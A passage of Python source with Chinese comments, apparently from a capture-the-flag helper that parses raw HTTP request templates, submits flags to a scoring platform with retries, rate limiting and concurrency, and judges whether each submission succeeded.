        self.method = method
        self.url = url
        self.headers = headers
        self.body = body
        self.is_json = is_json
        self.is_form = is_form
        self.raw = raw

    def __repr__(self):
        return 'Submission(%s %s json=%s form=%s)' % (
            self.method, self.url, self.is_json, self.is_form)


def _header_value(headers, name):
    """大小写不敏感地取请求头"""
    name = name.lower()
    for key, value in (headers or {}).items():
        if key.lower() == name:
            return value
    return ''


def _clean_headers(headers):
    """去掉 Content-Length，避免和 requests 自动计算的长度冲突"""
    return {k: v for k, v in (headers or {}).items()
            if k.lower() != 'content-length'}


def parse_http_request(raw):
    """
    解析原始 HTTP 报文，返回 (method, url, headers, body)，失败抛 ValueError。
    支持：CRLF/LF、绝对 URL、Host 带端口、大小写混合的请求头、折行头部。
    """
    raw = str(raw or '').replace('\r\n', '\n').replace('\r', '\n')
    if not raw.strip():
        raise ValueError('HTTP 请求报文为空')
    if '\n\n' in raw:
        head, body = raw.split('\n\n', 1)
    else:
        head, body = raw, ''
    lines = head.split('\n')
    if not lines or not lines[0].strip():
        raise ValueError('HTTP 请求报文格式错误')
    parts = lines[0].split()
    if len(parts) < 3:
        raise ValueError('请求行格式错误，应为：METHOD URL HTTP/x.x')
    method, target, _proto = parts[0].upper(), parts[1], parts[2]

    headers = {}
    host = ''
    last_key = None
    for line in lines[1:]:
        if not line.strip():
            continue
        if line[:1] in (' ', '\t') and last_key:
            headers[last_key] = headers[last_key] + ' ' + line.strip()
            continue
        if ':' not in line:
            continue
        key, value = line.split(':', 1)
        key = key.strip()
        value = value.strip()
        if not key:
            continue
        headers[key] = value
        last_key = key
        if key.lower() == 'host':
            host = value
    if not host:
        raise ValueError('请求头缺少 Host')

    host_port = ''
    if host.count(':') == 1:
        host_port = host.rsplit(':', 1)[1]
    scheme = 'https' if host_port in ('443', '8443') else 'http'
    # 浏览器抓 HTTPS 请求时 Host 常不带 :443，用 Origin/Referer/X-Forwarded-Proto 兜底
    origin = _header_value(headers, 'origin').lower()
    referer = _header_value(headers, 'referer').lower()
    if origin.startswith('https://') or referer.startswith('https://'):
        scheme = 'https'
    elif origin.startswith('http://') or referer.startswith('http://'):
        scheme = 'http'
    if _header_value(headers, 'x-forwarded-proto').lower() == 'https':
        scheme = 'https'
    if target.startswith('http://') or target.startswith('https://'):
        url = target
    elif target.startswith('/'):
        url = '%s://%s%s' % (scheme, host, target)
    else:
        url = '%s://%s/%s' % (scheme, host, target)
    return method, url, headers, body


def prepare_submission(raw):
    """解析并校验提交模板，返回 Submission；失败抛 ValueError"""
    method, url, headers, body = parse_http_request(raw)
    forced = str(getattr(config, '提交协议', 'auto') or 'auto').lower()
    if forced in ('http', 'https'):
        parsed = urlparse(url)
        url = urlunparse(parsed._replace(scheme=forced))
    ctype = _header_value(headers, 'content-type').lower()
    if 'multipart/form-data' in ctype:
        raise ValueError('暂不支持 multipart/form-data 提交，请改用表单或 JSON')
    is_json = 'json' in ctype
    is_form = ('x-www-form-urlencoded' in ctype
               or (not is_json and method in ('POST', 'PUT', 'PATCH')))
    if is_json and not body.strip():
        body = '{}'
    return Submission(method, url, headers, body, is_json, is_form, raw)


def _form_body(body, param_name, flag_value):
    """替换/追加表单参数，并对 flag 做 URL 编码"""
    pairs = parse_qsl(body, keep_blank_values=True) if body.strip() else []
    pairs = [(k, v) for (k, v) in pairs if k != param_name]
    pairs.append((param_name, flag_value))
    return urlencode(pairs)


def submit_flag_ex(session, submission, flag_value, param_name, timeout=None):
    """
    把 flag 拼进提交模板并发送，返回 response。
    - GET：params 追加；
    - JSON：只支持顶层对象，覆盖同名键；
    - 表单：先删同名键再追加，flag 做 URL 编码。
    """
    if isinstance(submission, str):
        submission = prepare_submission(submission)
    if not isinstance(submission, Submission):
        raise ValueError('提交模板类型错误')
    param_name = str(param_name or '').strip()
    if not param_name:
        raise ValueError('提交参数名为空')
    flag_value = str(flag_value or '').strip()
    if not flag_value:
        raise ValueError('flag 为空')
    timeout = timeout or config.请求超时
    headers = _clean_headers(submission.headers)
    method = submission.method
    url = submission.url

    if method == 'GET':
        return session.get(url, params={param_name: flag_value},
                           headers=headers, timeout=timeout, verify=False)

    if submission.is_json:
        try:
            data = json.loads(submission.body) if submission.body.strip() else {}
        except (TypeError, ValueError) as exc:
            raise ValueError('JSON 请求体无效：%s' % exc) from exc
        if not isinstance(data, dict):
            raise ValueError('JSON 请求体顶层必须是对象')
        data[param_name] = flag_value
        if method == 'POST':
            return session.post(url, json=data, headers=headers,
                                timeout=timeout, verify=False)
        return session.request(method, url, json=data, headers=headers,
                               timeout=timeout, verify=False)

    if submission.is_form:
        body = _form_body(submission.body, param_name, flag_value)
        if not _header_value(headers, 'content-type'):
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
        if method == 'POST':
            return session.post(url, data=body, headers=headers,
                                timeout=timeout, verify=False)
        return session.request(method, url, data=body, headers=headers,
                               timeout=timeout, verify=False)

    # 其他方法（PUT/PATCH 等）带表单体
    body = _form_body(submission.body, param_name, flag_value)
    if hasattr(session, 'request'):
        return session.request(method, url, data=body, headers=headers,
                               timeout=timeout, verify=False)
    raise ValueError('不支持的提交方法：%s' % method)


def submit_flag(session, raw_request, flag_value, param_name, timeout=None):
    """兼容旧接口：每次重新解析原始报文"""
    return submit_flag_ex(session, raw_request, flag_value, param_name, timeout)


def submit_flag_retry(session, submission, flag_value, param_name, timeout=None,
                      retries=1, backoff=0.3):
    """
    在 submit_flag_ex 外加重试：
    - 网络异常 / 5xx 重试；
    - 4xx（含 401/403/429）不重试，交给调用方熔断。
    """
    attempts = max(1, int(retries) + 1)
    last_exc = None
    for attempt in range(attempts):
        try:
            resp = submit_flag_ex(session, submission, flag_value,
                                  param_name, timeout)
        except requests.exceptions.RequestException as exc:
            last_exc = exc
            if attempt + 1 < attempts:
                if backoff > 0:
                    time.sleep(backoff)
                continue
            raise
        status = getattr(resp, 'status_code', 0)
        if 500 <= status < 600 and attempt + 1 < attempts:
            if backoff > 0:
                time.sleep(backoff)
            continue
        return resp
    if last_exc is not None:
        raise last_exc
    raise RuntimeError('提交失败')


class RateLimiter(object):
    """
    线程安全的提交限速器：按固定间隔全局分配发送时隙。
    interval <= 0 时不限速；clock/sleep 可注入，便于测试。
    """

    def __init__(self, interval, clock=None, sleep=None):
        self.interval = max(0.0, float(interval or 0))
        self.clock = clock or time.monotonic
        self.sleep = sleep or time.sleep
        self._lock = threading.Lock()
        self._next = 0.0

    def wait(self):
        if self.interval <= 0:
            return
        with self._lock:
            now = self.clock()
            delay = max(0.0, self._next - now)
            self._next = max(now, self._next) + self.interval
        if delay > 0:
            self.sleep(delay)


def describe_submission(submission, flag_value='flag{PREVIEW}', param_name='flag'):
    """
    不发送请求，返回实际会提交的 method / url / headers / body，用于预览和排障。
    """
    if isinstance(submission, str):
        submission = prepare_submission(submission)
    if not isinstance(submission, Submission):
        raise ValueError('提交模板类型错误')
    param_name = str(param_name or 'flag').strip() or 'flag'
    flag_value = str(flag_value or '').strip() or 'flag{PREVIEW}'
    headers = _clean_headers(submission.headers)
    method = submission.method
    url = submission.url

    if method == 'GET':
        parsed = urlparse(url)
        pairs = parse_qsl(parsed.query, keep_blank_values=True)
        pairs = [(k, v) for (k, v) in pairs if k != param_name]
        pairs.append((param_name, flag_value))
        url = urlunparse(parsed._replace(query=urlencode(pairs)))
        return {'method': method, 'url': url,
                'headers': headers, 'body': ''}

    if submission.is_json:
        try:
            data = json.loads(submission.body) if submission.body.strip() else {}
        except (TypeError, ValueError) as exc:
            raise ValueError('JSON 请求体无效：%s' % exc) from exc
        if not isinstance(data, dict):
            raise ValueError('JSON 请求体顶层必须是对象')
        data[param_name] = flag_value
        if not _header_value(headers, 'content-type'):
            headers['Content-Type'] = 'application/json'
        body = json.dumps(data, ensure_ascii=False, indent=2)
        return {'method': method, 'url': url,
                'headers': headers, 'body': body}

    body = _form_body(submission.body, param_name, flag_value)
    if not _header_value(headers, 'content-type'):
        headers['Content-Type'] = 'application/x-www-form-urlencoded'
    return {'method': method, 'url': url, 'headers': headers, 'body': body}


def _is_success_value(value):
    if value is True:
        return True
    if value is False or value is None:
        return False
    if isinstance(value, (int, float)):
        return value in (0, 200)
    text = str(value).strip().lower()
    return text in ('0', '200', 'ok', 'success', 'true', '成功')


def _response_brief(resp, limit=180):
    """提交响应摘要：去脚本/样式/HTML 标签、压成一行、截断，供失败/未知时直接看平台返回"""
    text = getattr(resp, 'text', '') or ''
    text = re.sub(r'(?is)<(script|style)[^>]*>.*?</\1>', ' ', text)
    text = re.sub(r'(?s)<[^>]+>', ' ', text)
    text = re.sub(r'\s+', ' ', text).strip()
    if not text:
        return ''
    return text[:limit] + ('…' if len(text) > limit else '')


def judge_submission(resp, ok_word=None):
    """
    判断提交结果，返回 (verdict, detail)：
      verdict: 'success' / 'fail' / 'unknown'
    优先级：成功关键字 > JSON 里的 code/errno/status/success > HTTP 状态。
    没有关键字、响应也不是可识别的 JSON 时返回 unknown，绝不默认成功。
    fail/unknown 的 detail 会附带响应包前 180 字，方便直接看平台报错。
    """
    text = getattr(resp, 'text', '') or ''
    status = getattr(resp, 'status_code', 0)
    brief = _response_brief(resp)
    suffix = ('，响应：%s' % brief) if brief else ''

    word = ok_word if ok_word is not None else config.成功关键字
    if word:
        if word in text:
            return 'success', '关键字命中：%s' % word
        return 'fail', '关键字未命中：%s%s' % (word, suffix)

    try:
        data = json.loads(text)
    except (TypeError, ValueError):
        data = None
    if isinstance(data, dict):
        for key in ('code', 'errno', 'status', 'success'):
            if key in data:
                value = data[key]
                msg = ''
                for msg_key in ('msg', 'message', 'error', 'info'):
                    if msg_key in data:
                        msg = str(data[msg_key])
                        break
                detail = '%s=%s%s' % (key, value, (' ' + msg) if msg else '')
                if key == 'success':
                    ok = (value is True
                          or str(value).strip().lower()
                          in ('1', 'true', 'ok', 'success', 'yes', '成功'))
                elif key == 'status':
                    ok = (value in (200, '200')
                          or str(value).strip().lower()
                          in ('ok', 'success', 'true', '成功'))
                else:
                    ok = _is_success_value(value)
                return ('success' if ok else 'fail'), detail

    if status == 0:
        return 'unknown', '无响应%s' % suffix
    if status >= 400:
        return 'fail', 'HTTP %s%s' % (status, suffix)
    return 'unknown', 'HTTP %s%s' % (status, suffix)


def judge_success(text, ok_word=None):
    """兼容旧接口：有关键字才判断，否则返回 None"""
    word = ok_word if ok_word is not None else config.成功关键字
    if not word:
        return None
    return word in (text or '')


# ======================================================================
# 并发批处理
# ======================================================================
def run_batch(items, fn, workers=8, stop=None, on_done=None):
    """
    并发执行 fn(item)，返回 [(item, result, error)]。
    - stop() 为真时取消未开始的任务；
    - on_done(row) 在结果产生时回调（用于 UI 逐条刷新），行格式 (item, result, error)。
    """
    from concurrent.futures import ThreadPoolExecutor, as_completed

    items = list(items or [])
    if not items:
        return []
    results = []
    workers = max(1, min(int(workers or 1), 200))
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(fn, item): item for item in items}
        for future in as_completed(futures):
            if stop is not None and stop():
                for f in futures:
                    f.cancel()
                break
            item = futures[future]
            try:
                result = future.result()
                error = None
            except Exception as exc:  # noqa: BLE001 - 单条失败不拖垮整批
                result, error = None, classify_error(exc)
            row = (item, result, error)
            results.append(row)
            if on_done:
                on_done(row)
    return results
